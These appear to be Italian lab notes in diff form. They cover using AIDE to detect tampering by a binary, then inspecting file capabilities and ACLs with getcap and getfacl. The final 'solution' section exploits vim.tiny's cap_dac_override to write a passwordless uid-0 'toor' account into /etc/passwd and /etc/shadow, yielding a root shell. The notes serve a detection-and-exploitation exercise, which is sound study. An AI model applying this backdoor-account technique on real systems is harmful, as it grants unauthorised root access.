@@ -1,0 +1,113 @@
+> FASE 1:
+
+[configurare AIDE per una scansione accurata di qualsiasi modifica 
+apportata dentro il sottoalbero /usr/bin e /etc:]
+
+sudo nano /etc/aide/aide.conf { 
+	linee cambiate: 
+	#@@x_include /etc/aide/aide.conf.d ^[a-zA-Z0-9_-]+$
+ 
+	aggiungo:
+	/usr/bin f Full
+	/etc f Full
+}
+
+[creare il database sul sistema pulito]
+sudo -i
+aideinit
+
+chiamo eseguibile con sudo: sudo ./change2
+
+[lanciare AIDE in modalità confronto per rilevare la modifica apportata]
+sudo aide -C -c /etc/aide/aide.conf
+
+diversi file modificati:
+File: /etc/passwd
+ Ctime     : 2025-02-20 14:51:14 +0100        | 2025-06-14 19:49:03 +0200
+
+File: /etc/shadow
+ Ctime     : 2025-02-20 14:51:14 +0100        | 2025-06-14 19:49:03 +0200
+
+File: /usr/bin/cp
+ Ctime     : 2024-11-30 15:21:21 +0100        | 2025-06-14 19:49:03 +0200
+ XAttrs    : num=0                            | num=1
+                                              | [1] security.capability <=> AAAA
+                                              | AgAAAAAAAAAAAAAAAAAAAAA=
+
+File: /usr/bin/tee
+ Ctime     : 2024-11-30 15:21:20 +0100        | 2025-06-14 19:49:03 +0200
+ XAttrs    : num=0                            | num=1
+                                              | [1] security.capability <=> AAAA
+                                              | AgAAAAAAAAAAAAAAAAAAAAA=
+
+File: /usr/bin/vim.tiny
+ Ctime     : 2025-02-19 18:46:24 +0100        | 2025-06-14 19:49:03 +0200
+ XAttrs    : num=0                            | num=1
+                                              | [1] security.capability <=> AQAA
+                                              | AgIAAAAAAAAAAAAAAAAAAAA=
+
+> FASE 2:
+
+[Cosa fa: Mostra le capabilities assegnate a un file, in particolare eseguibili.
+A cosa serve: Le Linux capabilities sono privilegi parziali che possono essere assegnati
+a binari senza richiedere root completo.]
+
+controllo /etc/passwd per cambiamenti --> nulla da segnalare
+
+/usr/sbin/getcap /usr/bin/cp --> niente
+/usr/sbin/getcap /usr/bin/tee --> niente
+/usr/sbin/getcap /usr/bin/vim.tiny --> /usr/bin/vim.tiny cap_dac_override=ep 
+
+man capabilities
+[CAP_DAC_OVERRIDE: Bypass file read, write, 
+and execute permission checks.  (DAC is an abbreviation of "discretionary access control".)]
+
+[Cosa fa: Mostra le ACL (Access Control List) di un file o directory in Linux.
+A cosa serve: Permette di vedere i permessi avanzati, oltre a quelli standard (rwx), 
+assegnati a utenti o gruppi specifici.]
+
+getfacl /usr/bin/cp
+getfacl: Removing leading '/' from absolute path names
+# file: usr/bin/cp
+# owner: root
+# group: root
+user::rwx
+group::r-x
+other::r-x (niente)
+
+getfacl /usr/bin/tee
+getfacl: Removing leading '/' from absolute path names
+# file: usr/bin/tee
+# owner: root
+# group: root
+user::rwx
+group::r-x
+other::r-x (niente)
+
+getfacl /usr/bin/vim.tiny
+getfacl: Removing leading '/' from absolute path names
+# file: usr/bin/vim.tiny
+# owner: root
+# group: root
+user::rwx
+group::r-x
+other::r-x
+
+mia soluzione:
+
+per vim:
+[Press o to add a new line below and type your text.
+Press Esc, then type :wq! and press Enter to save and exit. (+override)]
+
+vim.tiny /etc/passwd ["toor:x:0:0::/root:/bin/bash"]
+vim.tiny /etc/shadow ["toor::19509:0:99999:7:::"]
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ su toor 
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+
+
